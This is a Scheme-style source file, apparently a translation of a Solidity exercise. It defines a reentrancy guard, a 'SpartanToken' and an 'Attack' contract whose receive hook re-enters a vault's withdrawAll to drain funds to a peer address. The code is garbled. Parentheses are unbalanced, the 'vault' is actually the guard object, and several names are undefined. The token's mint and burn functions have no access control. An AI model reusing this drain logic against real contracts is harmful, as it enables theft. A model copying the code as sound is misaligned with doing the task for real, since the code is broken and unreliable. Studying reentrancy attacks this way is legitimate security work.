(define (make-ReentrancyGuard)
	(let ((locked #f))
		(define (noReentrant thunk)
			(assert (not locked) "No re-entrancy")
			(set! locked #t)
			(thunk)
			(set! locked #f)))

		(record
			(noReentrant noReentrant)
			(locked locked)))

(define (make-SpartanToken)
    (let ((balances (make-hash)) ; Hash table to store token balances
        (allowed (make-hash)) ; Hash table to store allowed token transfers
        (total-supply 0) ; Total supply of tokens
        (owner (make-parameter #f)))) ; Parameter to store the owner of the token

        (define (transfer-ownership new-owner)
            (owner new-owner)) ; Function to transfer ownership of the token
        
        (define (transfer _to _value)
            (let ((sender (owner)))
                (assert (>= (balance-of sender) _value) "Insufficient balance")
                (hash-update! balances sender (lambda (balance) (- balance _value)))
                (hash-update! balances _to (lambda (balance) (+ balance _value))))) ; Function to transfer tokens from sender to receiver

        (define (transfer-from _from _to _value)
            (let ((allowance (hash-ref allowed (list _from (owner)) 0)))
                (assert (and (>= (balance-of _from) _value) (>= allowance _value)) "Insufficient balance or allowance")
                (hash-update! balances _from (lambda (balance) (- balance _value)))
                (hash-update! balances _to (lambda (balance) (+ balance _value)))
                (hash-update! allowed (list _from (owner)) (lambda (allowance) (- allowance _value))))) ; Function to transfer tokens from a specific account to another account

        (define (balance-of _owner)
            (hash-ref balances _owner 0)) ; Function to get the balance of a specific account

        (define (approve _spender _value)
            (hash-set! allowed (list (owner) _spender) _value)) ; Function to approve token transfer from owner to spender

        (define (allowance _owner _spender)
            (hash-ref allowed (list _owner _spender) 0)) ; Function to get the allowed token transfer from owner to spender

        (define (mint _to _value)
            (hash-update! balances _to (lambda (balance) (+ balance _value)))
            (set! total-supply (+ total-supply _value))) ; Function to mint new tokens and add them to an account

        (define (burn-account _from)
            (let ((amount-to-burn (balance-of _from)))
            (hash-update! balances _from (lambda (balance) (- balance amount-to-burn)))
            (set! total-supply (- total-supply amount-to-burn)))) ; Function to burn all tokens in an account

        (record
            (transfer-ownership transfer-ownership)
            (transfer transfer)
            (transfer-from transfer-from)
            (balance-of balance-of)
            (approve approve)
            (allowance allowance)
            (mint mint)
            (burn-account burn-account))) ; Record representing the Spartan Token

(define (make-Attack)
  (let ((spartan-token (make-parameter #f))
    (spartan-vault (make-parameter #f))
    (attack-peer (make-parameter #f)))
  
  (define (set-attack-peer _attack-peer)
    (attack-peer _attack-peer))
  
  (define (attack-init)
    (let ((value (msg 'value)))
      (assert (= value (* 1 token)) "Require 1 token to attack")
      ((spartan-vault) 'deposit value)
      ; Function to initialize the attack
      ((spartan-vault) 'withdrawAll))) 
  
  (define (attack-next)
    ; Function to perform the next attack step
    ((spartan-vault) 'withdrawAll)) 
  
  (define (get-balance)
    (address.this 'balance))
  
  (define (receive)
    (let ((spartan-vault-balance ((spartan-vault) 'getBalance)))
      (when (>= spartan-vault-balance (* 1 token))
        ((spartan-token) 'transfer (address (attack-peer)) ((spartan-vault) 'getUserBalance (address.this))))))
  
  (record
    (setAttackPeer set-attack-peer)
    (attackInit attack-init)
    (attackNext attack-next)
    (getBalance get-balance)
    (receive receive))))

; Create an instance of the Spartan Token
(define spartan-token (make-SpartanToken)) 
; Create an instance of the Spartan Vault
(define spartan-vault (make-ReentrancyGuard)) 
; Create an instance of the Attack contract
(define attack (make-Attack))

(define (init _spartan-token _spartan-vault)
    (spartan-token _spartan-token)
    (spartan-vault _spartan-vault)
    (attack 'setAttackPeer attack))

; Call the init function with the Spartan Token and Spartan Vault instances
(init spartan-token spartan-vault)
